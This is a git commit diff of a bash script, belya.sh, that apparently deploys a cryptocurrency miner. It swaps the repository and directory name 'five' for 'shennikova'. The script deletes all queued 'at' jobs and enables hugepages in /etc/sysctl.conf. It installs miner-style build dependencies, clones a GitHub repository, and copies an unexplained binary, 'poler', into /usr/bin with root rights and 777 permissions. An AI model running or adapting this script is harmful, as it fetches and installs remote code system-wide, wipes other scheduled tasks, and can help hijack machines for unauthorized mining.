a173823aba66dc939c1c4a2e5d7bf4ec70490972
today100not <56802907+today100not@users.noreply.github.com>
2019-11-17 11:59:32 -0200

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/five/
+rm -rf /tmp/shennikova/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir five
-git clone https://github.com/today100not/five.git /tmp/five
-cd /tmp/five
-chmod +x /tmp/five/poler
+cd /tmp && mkdir shennikova
+git clone https://github.com/today100not/shennikova.git /tmp/shennikova
+cd /tmp/shennikova
+chmod +x /tmp/shennikova/poler
 chmod 777 ./*.sh
-cp /tmp/five/poler /usr/bin/
+cp /tmp/shennikova/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
